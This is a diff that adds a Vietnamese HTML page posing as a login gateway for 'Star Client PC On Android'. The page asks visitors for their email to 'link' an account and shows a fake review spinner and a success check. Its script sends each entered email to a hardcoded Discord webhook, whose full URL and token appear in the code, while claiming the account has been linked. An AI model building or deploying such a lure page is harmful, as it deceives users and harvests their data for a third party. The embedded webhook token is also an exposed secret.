@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Star Client · Android PC</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at 20% 30%, #0a0f1e, #03050b);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', 'Roboto', 'Orbitron', monospace;
+            padding: 1.5rem;
+        }
+
+        .star-card {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(10, 20, 30, 0.65);
+            backdrop-filter: blur(12px);
+            border-radius: 3rem;
+            border: 1px solid rgba(0, 255, 255, 0.25);
+            box-shadow: 0 25px 45px rgba(0,0,0,0.5), 0 0 0 1px rgba(0, 255, 255, 0.1) inset;
+            padding: 2rem 1.8rem 2.5rem;
+            transition: all 0.3s ease;
+        }
+
+        .title-glow {
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        .title-glow h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FFFFFF, #7dd3fc, #38bdf8);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 2px;
+            text-shadow: 0 0 8px rgba(0,200,255,0.4);
+        }
+
+        .sub {
+            text-align: center;
+            font-size: 0.8rem;
+            color: #9ca3cf;
+            margin-top: -6px;
+            letter-spacing: 1px;
+            font-weight: 400;
+            border-bottom: 1px dashed rgba(56, 189, 248, 0.3);
+            display: inline-block;
+            width: auto;
+            padding-bottom: 4px;
+        }
+
+        .client-credit {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #6c86a3;
+            margin-top: 5px;
+            margin-bottom: 2rem;
+            font-family: monospace;
+            background: rgba(0,0,0,0.3);
+            display: inline-block;
+            width: 100%;
+            padding: 4px 0;
+            border-radius: 40px;
+        }
+
+        .panel {
+            transition: opacity 0.35s ease, transform 0.3s ease;
+        }
+
+        .input-area {
+            margin: 1.8rem 0 1.2rem;
+        }
+
+        .mail-label {
+            display: block;
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: #b9d0f0;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+        }
+
+        .mail-input-wrapper {
+            background: rgba(0, 0, 0, 0.55);
+            border-radius: 60px;
+            border: 1px solid #2c4b6e;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            backdrop-filter: blur(4px);
+        }
+
+        .mail-input-wrapper:focus-within {
+            border-color: #3b82f6;
+            box-shadow: 0 0 10px rgba(59,130,246,0.3);
+        }
+
+        .mail-input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 1rem 1.5rem;
+            font-size: 1rem;
+            color: #f0f3ff;
+            outline: none;
+            font-family: monospace;
+        }
+
+        .mail-input::placeholder {
+            color: #6d8bb0;
+            font-size: 0.85rem;
+            font-style: italic;
+            opacity: 0.8;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(95deg, #0f2b3d, #0a1a2a);
+            border: 1px solid #2c6e9e;
+            padding: 0.9rem;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: #caf0ff;
+            margin-top: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+            letter-spacing: 1.5px;
+            backdrop-filter: blur(5px);
+        }
+
+        .submit-btn:active {
+            transform: scale(0.97);
+        }
+
+        .review-area {
+            text-align: center;
+            margin: 1.5rem 0;
+        }
+
+        .review-title {
+            font-size: 1.4rem;
+            font-weight: 600;
+            background: linear-gradient(120deg, #f0e6a0, #facc15);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.75rem;
+        }
+
+        .review-sub {
+            font-size: 0.8rem;
+            color: #9cb6d9;
+            margin-bottom: 1.8rem;
+        }
+
+        .loader-ring {
+            display: inline-block;
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(56, 189, 248, 0.2);
+            border-top: 5px solid #38bdf8;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            margin: 1rem auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg);}
+            100% { transform: rotate(360deg);}
+        }
+
+        .hidden-reset-btn {
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 2rem;
+            padding: 0.5rem;
+            transition: all 0.1s;
+            outline: none;
+        }
+
+        .reset-circle {
+            width: 48px;
+            height: 48px;
+            background: rgba(255,255,255,0.02);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(56,189,248,0.2);
+            transition: 0.2s;
+        }
+        
+        .reset-circle span {
+            font-size: 0px;
+        }
+        
+        .hidden-reset-btn:hover .reset-circle {
+            background: rgba(56,189,248,0.1);
+            border-color: rgba(56,189,248,0.5);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .tiny-note {
+            text-align: center;
+            font-size: 0.6rem;
+            color: #2a445e;
+            margin-top: 1.5rem;
+        }
+
+        @media (max-width: 480px) {
+            .star-card {
+                padding: 1.5rem;
+            }
+            .title-glow h1 {
+                font-size: 1.8rem;
+            }
+        }
+
+        .checkmark {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: rgba(34, 197, 94, 0.2);
+            border: 2px solid #22c55e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            animation: pulse 0.5s ease;
+        }
+        
+        .checkmark svg {
+            width: 35px;
+            height: 35px;
+            stroke: #22c55e;
+            stroke-width: 2;
+            fill: none;
+        }
+        
+        .error-mark {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: rgba(239, 68, 68, 0.2);
+            border: 2px solid #ef4444;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+        }
+        
+        .error-mark svg {
+            width: 35px;
+            height: 35px;
+            stroke: #ef4444;
+            stroke-width: 2;
+            fill: none;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="star-card" id="starApp">
+    <div class="title-glow">
+        <h1>Star Client PC</h1>
+        <div style="text-align: center; margin-top: -6px;">
+            <span class="sub">On Android</span>
+        </div>
+    </div>
+    <div class="client-credit">
+        client by PUDADJ
+    </div>
+
+    <!-- Panel nhập email -->
+    <div id="emailPanel" class="panel">
+        <div class="input-area">
+            <div class="mail-label">✉️ Email đăng nhập</div>
+            <div class="mail-input-wrapper">
+                <input type="email" id="emailInput" class="mail-input" placeholder="vd: abc@gmail.com" autocomplete="email">
+            </div>
+        </div>
+        <button id="submitEmailBtn" class="submit-btn">XÁC THỰC & LIÊN KẾT</button>
+    </div>
+
+    <!-- Panel đang kiểm duyệt -->
+    <div id="reviewPanel" class="panel hidden">
+        <div class="review-area">
+            <div class="review-title">⚡ ĐANG KIỂM DUYỆT ⚡</div>
+            <div class="review-sub">liên kết tài khoản với client ...</div>
+            <div class="loader-ring" id="loadingSpinner"></div>
+            <div id="statusMessage" style="font-size: 0.8rem; color: #93c5fd; margin-top: 1rem;">Đang xử lý, vui lòng chờ</div>
+        </div>
+    </div>
+
+    <!-- Nút ẩn (vòng tròn) - nhấn vào sẽ quay lại giao diện nhập email -->
+    <button id="hiddenResetBtn" class="hidden-reset-btn" aria-label="reset">
+        <div class="reset-circle">
+            <span>↻</span>
+        </div>
+    </button>
+    <div class="tiny-note">
+        ✦ secure gateway ✦
+    </div>
+</div>
+
+<script>
+    // Discord Webhook (đã được cập nhật)
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1475836384672485408/Z5NgvEYsAmzgUALPjA7R6UlXrcsHk6SSWuvy1BK62Xx-iPlcXzBlgXH1ArMAjl-s54Ct";
+    
+    let currentState = "email"; // email hoặc review
+    
+    const emailPanel = document.getElementById('emailPanel');
+    const reviewPanel = document.getElementById('reviewPanel');
+    const submitBtn = document.getElementById('submitEmailBtn');
+    const emailInput = document.getElementById('emailInput');
+    const hiddenReset = document.getElementById('hiddenResetBtn');
+    const statusMsgSpan = document.getElementById('statusMessage');
+    const loadingSpinner = document.getElementById('loadingSpinner');
+    
+    // Hiển thị panel nhập email (reset về trạng thái ban đầu)
+    function showEmailPanel() {
+        emailPanel.classList.remove('hidden');
+        reviewPanel.classList.add('hidden');
+        currentState = "email";
+        // Xóa giá trị email cũ
+        emailInput.value = '';
+        // Bật lại nút submit
+        submitBtn.disabled = false;
+        submitBtn.style.opacity = '1';
+        // Focus vào ô input
+        setTimeout(() => emailInput.focus(), 100);
+    }
+    
+    // Hiển thị panel kiểm duyệt
+    function showReviewPanel() {
+        emailPanel.classList.add('hidden');
+        reviewPanel.classList.remove('hidden');
+        currentState = "review";
+        // Reset lại thông báo và spinner
+        if (statusMsgSpan) {
+            statusMsgSpan.innerHTML = 'Đang kiểm duyệt, xác thực email...';
+            statusMsgSpan.style.color = '#93c5fd';
+        }
+        if (loadingSpinner) {
+            loadingSpinner.style.display = 'inline-block';
+        }
+        // Xóa các icon check/error cũ nếu có
+        const existingMark = document.querySelector('.checkmark, .error-mark');
+        if (existingMark) existingMark.remove();
+    }
+    
+    // Gửi email đến Discord webhook
+    async function sendEmailToWebhook(email) {
+        if (!email || !/^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(email)) {
+            throw new Error("Email không hợp lệ, vui lòng nhập đúng định dạng.");
+        }
+        
+        const payload = {
+            username: "Star Client System",
+            avatar_url: "https://cdn.discordapp.com/attachments/xxx/starclient.png",
+            embeds: [{
+                title: "✨ STAR CLIENT LOGIN ✨",
+                color: 0x38bdf8,
+                fields: [
+                    {
+                        name: "📧 Email Đăng Nhập",
+                        value: `\`\`\`${email}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "💻 Client",
+                        value: "Star Client PC On Android",
+                        inline: true
+                    },
+                    {
+                        name: "👤 Credit",
+                        value: "client by PUDADJ",
+                        inline: true
+                    },
+                    {
+                        name: "🔗 Trạng Thái",
+                        value: "✅ Đã liên kết tài khoản",
+                        inline: false
+                    },
+                    {
+                        name: "🕐 Thời gian",
+                        value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "Star Client Gateway • Secure Login"
+                },
+                timestamp: new Date().toISOString()
+            }]
+        };
+        
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Webhook response error: ${response.status}`);
+        }
+        
+        return { success: true };
+    }
+    
+    // Hiển thị thành công trong panel review
+    function showSuccessInReview(email) {
+        if (loadingSpinner) loadingSpinner.style.display = 'none';
+        
+        const existingMark = document.querySelector('.checkmark, .error-mark');
+        if (existingMark) existingMark.remove();
+        
+        const reviewArea = document.querySelector('#reviewPanel .review-area');
+        const successDiv = document.createElement('div');
+        successDiv.className = 'checkmark';
+        successDiv.innerHTML = `<svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
+        
+        const oldLoader = document.querySelector('#reviewPanel .loader-ring');
+        if (oldLoader) oldLoader.style.display = 'none';
+        
+        reviewArea.insertBefore(successDiv, document.getElementById('statusMessage'));
+        
+        if (statusMsgSpan) {
+            statusMsgSpan.innerHTML = `✅ ĐÃ LIÊN KẾT THÀNH CÔNG! ✅<br><span style="font-size:0.7rem;">📧 ${email}</span><br><span style="font-size:0.7rem;">Đã gửi thông tin đến webhook</span>`;
+            statusMsgSpan.style.color = '#4ade80';
+        }
+    }
+    
+    // Hiển thị lỗi trong panel review
+    function showErrorInReview(message) {
+        if (loadingSpinner) loadingSpinner.style.display = 'none';
+        
+        const existingMark = document.querySelector('.checkmark, .error-mark');
+        if (existingMark) existingMark.remove();
+        
+        const reviewArea = document.querySelector('#reviewPanel .review-area');
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'error-mark';
+        errorDiv.innerHTML = `<svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>`;
+        
+        const oldLoader = document.querySelector('#reviewPanel .loader-ring');
+        if (oldLoader) oldLoader.style.display = 'none';
+        
+        reviewArea.insertBefore(errorDiv, document.getElementById('statusMessage'));
+        
+        if (statusMsgSpan) {
+            statusMsgSpan.innerHTML = `⚠️ ${message}<br><span style="font-size:0.7rem;">Vui lòng thử lại hoặc nhấn nút ẩn bên dưới để quay lại</span>`;
+            statusMsgSpan.style.color = '#f87171';
+        }
+    }
+    
+    // Xử lý khi submit email
+    async function handleSubmitEmail(email) {
+        if (!email) {
+            alert("Vui lòng nhập địa chỉ email.");
+            return;
+        }
+        if (!/^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(email)) {
+            alert("Email không hợp lệ! Ví dụ: abc@gmail.com");
+            return;
+        }
+        
+        // Chuyển sang panel kiểm duyệt
+        showReviewPanel();
+        
+        try {
+            // Gửi đến webhook Discord
+            await sendEmailToWebhook(email);
+            // Hiển thị thành công
+            showSuccessInReview(email);
+        } catch (err) {
+            console.error("Submit error:", err);
+            showErrorInReview(err.message || "Lỗi kết nối webhook, vui lòng thử lại sau");
+        }
+    }
+    
+    // Xử lý nút ẩn: quay lại giao diện nhập email (hiện khung nhập để nhập lại từ đầu)
+    function handleResetToEmail() {
+        // Nếu đang ở review panel, quay về email panel
+        if (currentState === "review") {
+            showEmailPanel();
+        } 
+        // Nếu đang ở email panel, cũng reset lại (xóa input)
+        else if (currentState === "email") {
+            emailInput.value = '';
+            emailInput.focus();
+        }
+    }
+    
+    // Khởi tạo sự kiện
+    function init() {
+        // Nút submit
+        submitBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            const email = emailInput.value.trim();
+            handleSubmitEmail(email);
+        });
+        
+        // Nhấn Enter trong ô input
+        emailInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                const email = emailInput.value.trim();
+                handleSubmitEmail(email);
+            }
+        });
+        
+        // Nút ẩn (vòng tròn) - quay lại giao diện nhập email
+        hiddenReset.addEventListener('click', (e) => {
+            e.preventDefault();
+            handleResetToEmail();
+        });
+    }
+    
+    // Chạy khởi tạo
+    init();
+</script>
+</body>
+</html>
